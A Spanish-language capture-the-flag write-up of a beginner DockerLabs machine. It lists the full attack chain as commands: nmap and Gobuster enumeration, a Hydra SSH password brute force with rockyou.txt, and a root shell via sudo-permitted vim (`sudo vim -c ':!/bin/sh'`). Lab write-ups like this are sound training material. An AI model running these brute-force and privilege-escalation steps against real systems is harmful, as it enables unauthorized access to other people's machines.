# Write-up - Escalada con Vim

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 25/05/2025  
**Aprendizaje:** Aprendí a utilizar `sudo -l` para listar programas que se ejecutan con privilegios de administrador. También investigué formas de escalada de privilegios mediante búsquedas web y el uso de la página [GTFOBins](https://gtfobins.github.io/), que recopila técnicas conocidas para abusar de binarios comunes.

---

## Enumeración y acceso

### 1. Escaneo de puertos

`sudo nmap -sFV -O --open 172.18.0.2`

> Resultado:

`22/tcp => SSH`

`80/tcp => HTTP`

`Sistema operativo: Linux`

### 2. Enumeración de directorios con Gobuster

`gobuster dir -u http://172.18.0.2 -w rockyou.txt -x php,html,txt -q -b 404,403`

> Resultado:
Encontrado `/secret.php` con información que revela el usuario `mario`.

### 3. Ataque de fuerza bruta con Hydra

`hydra -l mario -P rockyou.txt -V ssh://172.18.0.2`

Credenciales encontradas:

> Usuario: `mario`

> Contraseña: `chocolate`

### 4. Acceso por SSH

`ssh -l mario 172.18.0.2`

## Escalada de privilegios

### 5. Revisión de binarios con sudo -l

`sudo -l`

> Resultado:

`/usr/bin/vim`

### 6. Escalada con Vim

Investigando el binario habilitado, se encuentra que `vim` puede ser abusado para obtener una shell como root:

`sudo vim -c ':!/bin/sh'`

### 7. Verificación

whoami
> root
